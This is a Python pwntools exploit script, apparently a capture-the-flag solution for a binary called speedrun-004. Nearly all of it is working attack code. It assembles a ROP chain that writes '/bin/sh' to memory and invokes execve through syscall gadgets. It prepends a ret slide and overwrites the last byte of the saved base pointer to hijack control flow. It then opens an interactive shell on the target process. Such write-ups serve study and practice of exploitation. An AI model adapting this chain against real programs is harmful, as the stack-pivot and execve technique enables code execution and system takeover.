#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./speedrun-004
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './speedrun-004')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
start
bp 0x00400baf
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

# ----------- gadget preparation -----------------

poprax = ROP(exe).find_gadget(["pop rax", "ret"])[0] # available
poprdi = ROP(exe).find_gadget(["pop rdi", "ret"])[0] # available
poprsi = ROP(exe).find_gadget(["pop rsi", "ret"])[0] # available
poprdx = ROP(exe).find_gadget(["pop rdx", "ret"])[0] # available
syscall = ROP(exe).find_gadget(["syscall"])[0] # available
mov = 0x0000000000418c37 # mov qword ptr [rdx], rax ; ret
binsh_addr = 0x6b9000
ret = ROP(exe).find_gadget(["ret"])[0] # available

# ------------ chain -------------------------------

payload = b""
# mov qword ptr [rdx], rax ; ret
payload += p64(poprdx)
payload += p64(binsh_addr)
payload += p64(poprax)
payload += b"/bin/sh\x00"
payload += p64(mov)

#-------ROP TO SYSCALL---------

# syscall sys_execve
# rax: 59
# rdi: address of command
# rsi: 0
# rdx: 0

payload += p64(poprax)
payload += p64(59)
payload += p64(poprdi)
payload += p64(binsh_addr)
payload += p64(poprsi)
payload += p64(0)
payload += p64(poprdx)
payload += p64(0)
payload += p64(syscall)

#----------------------------
# ret slide
payload = p64(ret) * int((0x100 - len(payload))/8) + payload

# overwrite last byte of bp
payload += b"\x00"

io = start()

io.sendlineafter(b"how much do you have to say?", b"257")
io.sendafter(b"Ok, what do you have to say for yourself?", payload)

io.interactive()


